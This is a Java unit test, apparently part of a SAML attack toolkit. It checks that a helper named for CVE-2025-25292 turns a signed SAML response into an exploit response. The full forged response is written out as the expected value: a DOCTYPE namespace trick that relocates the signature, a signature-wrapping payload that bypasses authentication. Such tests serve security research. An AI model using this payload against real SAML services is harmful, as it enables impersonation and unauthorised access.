package helpers;

import java.util.Arrays;
import java.util.stream.Collectors;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.assertEquals;

public class CVE_2025_25292_Test {

    @Test
    void testCVE_2025_25292() throws Exception {
        String originalAssertion = "<samlp:Response xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\" xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" ID=\"_8e8dc5f69a98cc4c1ff3427e5ce34606fd672f91e6\" Version=\"2.0\" IssueInstant=\"2014-07-17T01:01:48Z\" Destination=\"http://sp.example.com/demo1/index.php?acs\" InResponseTo=\"ONELOGIN_4fee3b046395c4e751011e97f8900b5273d56685\">\n" +
                "  <saml:Issuer>http://idp.example.com/metadata.php</saml:Issuer>\n" +
                "  <samlp:Status>\n" +
                "    <samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/>\n" +
                "  </samlp:Status>\n" +
                "  <saml:Assertion xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" ID=\"pfxe98fefdb-abe8-b5a0-51cc-420494edd4d2\" Version=\"2.0\" IssueInstant=\"2014-07-17T01:01:48Z\">\n" +
                "    <saml:Issuer>http://idp.example.com/metadata.php</saml:Issuer><ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">\n" +
                "  <ds:SignedInfo><ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/>\n" +
                "    <ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"/>\n" +
                "  <ds:Reference URI=\"#pfxe98fefdb-abe8-b5a0-51cc-420494edd4d2\"><ds:Transforms><ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></ds:Transforms><ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\"/><ds:DigestValue>jD7cZy+vZBy2qJgf21D2ybTDCTE=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>LfSKTTLlNsRNi0c+XJUrUH1rrVcLFR/IZOeyTWU3rGe3a2c++dLyNMV00oClk9lcPk+/P6qOtpaZFkFDQTHAYP0yEroInIBx24g5jBxLib8SAFZaH5tQHw8LzCVSksPJpCVBXHC9wOvnD1ui4GfxFkjbuxtUcylBA63F1jAA1FI=</ds:SignatureValue>\n" +
                "<ds:KeyInfo><ds:X509Data><ds:X509Certificate>MIICajCCAdOgAwIBAgIBADANBgkqhkiG9w0BAQ0FADBSMQswCQYDVQQGEwJ1czETMBEGA1UECAwKQ2FsaWZvcm5pYTEVMBMGA1UECgwMT25lbG9naW4gSW5jMRcwFQYDVQQDDA5zcC5leGFtcGxlLmNvbTAeFw0xNDA3MTcxNDEyNTZaFw0xNTA3MTcxNDEyNTZaMFIxCzAJBgNVBAYTAnVzMRMwEQYDVQQIDApDYWxpZm9ybmlhMRUwEwYDVQQKDAxPbmVsb2dpbiBJbmMxFzAVBgNVBAMMDnNwLmV4YW1wbGUuY29tMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDZx+ON4IUoIWxgukTb1tOiX3bMYzYQiwWPUNMp+Fq82xoNogso2bykZG0yiJm5o8zv/sd6pGouayMgkx/2FSOdc36T0jGbCHuRSbtia0PEzNIRtmViMrt3AeoWBidRXmZsxCNLwgIV6dn2WpuE5Az0bHgpZnQxTKFek0BMKU/d8wIDAQABo1AwTjAdBgNVHQ4EFgQUGHxYqZYyX7cTxKVODVgZwSTdCnwwHwYDVR0jBBgwFoAUGHxYqZYyX7cTxKVODVgZwSTdCnwwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQ0FAAOBgQByFOl+hMFICbd3DJfnp2Rgd/dqttsZG/tyhILWvErbio/DEe98mXpowhTkC04ENprOyXi7ZbUqiicF89uAGyt1oqgTUCD1VsLahqIcmrzgumNyTwLGWo17WDAa1/usDhetWAMhgzF/Cnf5ek0nK00m0YZGyc4LzgD0CROMASTWNg==</ds:X509Certificate></ds:X509Data></ds:KeyInfo></ds:Signature>\n" +
                "    <saml:Subject>\n" +
                "      <saml:NameID SPNameQualifier=\"http://sp.example.com/demo1/metadata.php\" Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:transient\">_ce3d2948b4cf20146dee0a0b3dd6f69b6cf86f62d7</saml:NameID>\n" +
                "      <saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\">\n" +
                "        <saml:SubjectConfirmationData NotOnOrAfter=\"2024-01-18T06:21:48Z\" Recipient=\"http://sp.example.com/demo1/index.php?acs\" InResponseTo=\"ONELOGIN_4fee3b046395c4e751011e97f8900b5273d56685\"/>\n" +
                "      </saml:SubjectConfirmation>\n" +
                "    </saml:Subject>\n" +
                "    <saml:Conditions NotBefore=\"2014-07-17T01:01:18Z\" NotOnOrAfter=\"2024-01-18T06:21:48Z\">\n" +
                "      <saml:AudienceRestriction>\n" +
                "        <saml:Audience>http://sp.example.com/demo1/metadata.php</saml:Audience>\n" +
                "      </saml:AudienceRestriction>\n" +
                "    </saml:Conditions>\n" +
                "    <saml:AuthnStatement AuthnInstant=\"2014-07-17T01:01:48Z\" SessionNotOnOrAfter=\"2024-07-17T09:01:48Z\" SessionIndex=\"_be9967abd904ddcae3c0eb4189adbe3f71e327cf93\">\n" +
                "      <saml:AuthnContext>\n" +
                "        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>\n" +
                "      </saml:AuthnContext>\n" +
                "    </saml:AuthnStatement>\n" +
                "    <saml:AttributeStatement>\n" +
                "      <saml:Attribute Name=\"uid\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\">\n" +
                "        <saml:AttributeValue xsi:type=\"xs:string\">test</saml:AttributeValue>\n" +
                "      </saml:Attribute>\n" +
                "      <saml:Attribute Name=\"mail\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\">\n" +
                "        <saml:AttributeValue xsi:type=\"xs:string\">test@example.com</saml:AttributeValue>\n" +
                "      </saml:Attribute>\n" +
                "      <saml:Attribute Name=\"eduPersonAffiliation\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\">\n" +
                "        <saml:AttributeValue xsi:type=\"xs:string\">users</saml:AttributeValue>\n" +
                "        <saml:AttributeValue xsi:type=\"xs:string\">examplerole1</saml:AttributeValue>\n" +
                "      </saml:Attribute>\n" +
                "    </saml:AttributeStatement>\n" +
                "  </saml:Assertion>\n" +
                "</samlp:Response>";

        String exploitAssertion = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE Response [<!ATTLIST Signature xmlns CDATA #FIXED \"http://www.w3.org/2000/09/xmldsig#\" xmlns CDATA \"block\">]>\n" +
                "<samlp:Response Destination=\"http://sp.example.com/demo1/index.php?acs\" ID=\"_8e8dc5f69a98cc4c1ff3427e5ce34606fd672f91e6\" InResponseTo=\"ONELOGIN_4fee3b046395c4e751011e97f8900b5273d56685\" IssueInstant=\"TIME\" Version=\"2.0\" xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\" xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\">\n" +
                "  <saml:Issuer>http://idp.example.com/metadata.php</saml:Issuer>\n" +
                "  <samlp:Status>\n" +
                "    <samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/>\n" +
                "  <samlp:StatusDetail><Signature>\n" +
                "  <ds:SignedInfo><ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/>\n" +
                "    <ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"/>\n" +
                "  <ds:Reference URI=\"#pfxe98fefdb-abe8-b5a0-51cc-420494edd4d2\"><ds:Transforms><ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></ds:Transforms><ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\"/><ds:DigestValue>jD7cZy+vZBy2qJgf21D2ybTDCTE=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>LfSKTTLlNsRNi0c+XJUrUH1rrVcLFR/IZOeyTWU3rGe3a2c++dLyNMV00oClk9lcPk+/P6qOtpaZFkFDQTHAYP0yEroInIBx24g5jBxLib8SAFZaH5tQHw8LzCVSksPJpCVBXHC9wOvnD1ui4GfxFkjbuxtUcylBA63F1jAA1FI=</ds:SignatureValue>\n" +
                "<ds:KeyInfo><ds:X509Data><ds:X509Certificate>MIICajCCAdOgAwIBAgIBADANBgkqhkiG9w0BAQ0FADBSMQswCQYDVQQGEwJ1czETMBEGA1UECAwKQ2FsaWZvcm5pYTEVMBMGA1UECgwMT25lbG9naW4gSW5jMRcwFQYDVQQDDA5zcC5leGFtcGxlLmNvbTAeFw0xNDA3MTcxNDEyNTZaFw0xNTA3MTcxNDEyNTZaMFIxCzAJBgNVBAYTAnVzMRMwEQYDVQQIDApDYWxpZm9ybmlhMRUwEwYDVQQKDAxPbmVsb2dpbiBJbmMxFzAVBgNVBAMMDnNwLmV4YW1wbGUuY29tMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDZx+ON4IUoIWxgukTb1tOiX3bMYzYQiwWPUNMp+Fq82xoNogso2bykZG0yiJm5o8zv/sd6pGouayMgkx/2FSOdc36T0jGbCHuRSbtia0PEzNIRtmViMrt3AeoWBidRXmZsxCNLwgIV6dn2WpuE5Az0bHgpZnQxTKFek0BMKU/d8wIDAQABo1AwTjAdBgNVHQ4EFgQUGHxYqZYyX7cTxKVODVgZwSTdCnwwHwYDVR0jBBgwFoAUGHxYqZYyX7cTxKVODVgZwSTdCnwwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQ0FAAOBgQByFOl+hMFICbd3DJfnp2Rgd/dqttsZG/tyhILWvErbio/DEe98mXpowhTkC04ENprOyXi7ZbUqiicF89uAGyt1oqgTUCD1VsLahqIcmrzgumNyTwLGWo17WDAa1/usDhetWAMhgzF/Cnf5ek0nK00m0YZGyc4LzgD0CROMASTWNg==</ds:X509Certificate></ds:X509Data></ds:KeyInfo></Signature></samlp:StatusDetail></samlp:Status>\n" +
                "  <saml:Assertion ID=\"pfxe98fefdb-abe8-b5a0-51cc-420494edd4d2\" IssueInstant=\"TIME\" Version=\"2.0\" xmlns:example=\"http://example.com\u0080\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">\n" +
                "    <saml:Issuer>http://idp.example.com/metadata.php</saml:Issuer><ds:Signature>\n" +
                "  <ds:SignedInfo><ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/>\n" +
                "    <ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"/>\n" +
                "  <ds:Reference URI=\"#pfxe98fefdb-abe8-b5a0-51cc-420494edd4d2\"><ds:Transforms><ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></ds:Transforms><ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\"/><ds:DigestValue>2jmj7l5rSw0yVb/vlWAYkK/YBwk=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>LfSKTTLlNsRNi0c+XJUrUH1rrVcLFR/IZOeyTWU3rGe3a2c++dLyNMV00oClk9lcPk+/P6qOtpaZFkFDQTHAYP0yEroInIBx24g5jBxLib8SAFZaH5tQHw8LzCVSksPJpCVBXHC9wOvnD1ui4GfxFkjbuxtUcylBA63F1jAA1FI=</ds:SignatureValue>\n" +
                "<ds:KeyInfo><ds:X509Data><ds:X509Certificate>MIICajCCAdOgAwIBAgIBADANBgkqhkiG9w0BAQ0FADBSMQswCQYDVQQGEwJ1czETMBEGA1UECAwKQ2FsaWZvcm5pYTEVMBMGA1UECgwMT25lbG9naW4gSW5jMRcwFQYDVQQDDA5zcC5leGFtcGxlLmNvbTAeFw0xNDA3MTcxNDEyNTZaFw0xNTA3MTcxNDEyNTZaMFIxCzAJBgNVBAYTAnVzMRMwEQYDVQQIDApDYWxpZm9ybmlhMRUwEwYDVQQKDAxPbmVsb2dpbiBJbmMxFzAVBgNVBAMMDnNwLmV4YW1wbGUuY29tMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDZx+ON4IUoIWxgukTb1tOiX3bMYzYQiwWPUNMp+Fq82xoNogso2bykZG0yiJm5o8zv/sd6pGouayMgkx/2FSOdc36T0jGbCHuRSbtia0PEzNIRtmViMrt3AeoWBidRXmZsxCNLwgIV6dn2WpuE5Az0bHgpZnQxTKFek0BMKU/d8wIDAQABo1AwTjAdBgNVHQ4EFgQUGHxYqZYyX7cTxKVODVgZwSTdCnwwHwYDVR0jBBgwFoAUGHxYqZYyX7cTxKVODVgZwSTdCnwwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQ0FAAOBgQByFOl+hMFICbd3DJfnp2Rgd/dqttsZG/tyhILWvErbio/DEe98mXpowhTkC04ENprOyXi7ZbUqiicF89uAGyt1oqgTUCD1VsLahqIcmrzgumNyTwLGWo17WDAa1/usDhetWAMhgzF/Cnf5ek0nK00m0YZGyc4LzgD0CROMASTWNg==</ds:X509Certificate></ds:X509Data></ds:KeyInfo></ds:Signature>\n" +
                "    <saml:Subject>\n" +
                "      <saml:NameID Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:transient\" SPNameQualifier=\"http://sp.example.com/demo1/metadata.php\">_ce3d2948b4cf20146dee0a0b3dd6f69b6cf86f62d7</saml:NameID>\n" +
                "      <saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\">\n" +
                "        <saml:SubjectConfirmationData InResponseTo=\"ONELOGIN_4fee3b046395c4e751011e97f8900b5273d56685\" NotOnOrAfter=\"TIME\" Recipient=\"http://sp.example.com/demo1/index.php?acs\"/>\n" +
                "      </saml:SubjectConfirmation>\n" +
                "    </saml:Subject>\n" +
                "    <saml:Conditions NotBefore=\"TIME\" NotOnOrAfter=\"TIME\">\n" +
                "      <saml:AudienceRestriction>\n" +
                "        <saml:Audience>http://sp.example.com/demo1/metadata.php</saml:Audience>\n" +
                "      </saml:AudienceRestriction>\n" +
                "    </saml:Conditions>\n" +
                "    <saml:AuthnStatement AuthnInstant=\"2014-07-17T01:01:48Z\" SessionIndex=\"_be9967abd904ddcae3c0eb4189adbe3f71e327cf93\" SessionNotOnOrAfter=\"TIME\">\n" +
                "      <saml:AuthnContext>\n" +
                "        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>\n" +
                "      </saml:AuthnContext>\n" +
                "    </saml:AuthnStatement>\n" +
                "    <saml:AttributeStatement>\n" +
                "      <saml:Attribute Name=\"uid\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\">\n" +
                "        <saml:AttributeValue xsi:type=\"xs:string\">test</saml:AttributeValue>\n" +
                "      </saml:Attribute>\n" +
                "      <saml:Attribute Name=\"mail\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\">\n" +
                "        <saml:AttributeValue xsi:type=\"xs:string\">test@example.com</saml:AttributeValue>\n" +
                "      </saml:Attribute>\n" +
                "      <saml:Attribute Name=\"eduPersonAffiliation\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\">\n" +
                "        <saml:AttributeValue xsi:type=\"xs:string\">users</saml:AttributeValue>\n" +
                "        <saml:AttributeValue xsi:type=\"xs:string\">examplerole1</saml:AttributeValue>\n" +
                "      </saml:Attribute>\n" +
                "    </saml:AttributeStatement>\n" +
                "  </saml:Assertion>\n" +
                "</samlp:Response>";

        var exploit = CVE_2025_25292.apply(originalAssertion);
        exploit = Arrays.stream(exploit.split("\n"))
                .map(line -> line
                        .replaceAll("IssueInstant=\"[^\"]+\"", "IssueInstant=\"TIME\"")
                        .replaceAll("NotBefore=\"[^\"]+\"", "NotBefore=\"TIME\"")
                        .replaceAll("NotOnOrAfter=\"[^\"]+\"", "NotOnOrAfter=\"TIME\"")
                        .replaceAll("SessionNotOnOrAfter=\"[^\"]+\"", "SessionNotOnOrAfter=\"TIME\"")
                )
                .collect(Collectors.joining("\n"));
        assertEquals(exploitAssertion, exploit);
    }
}
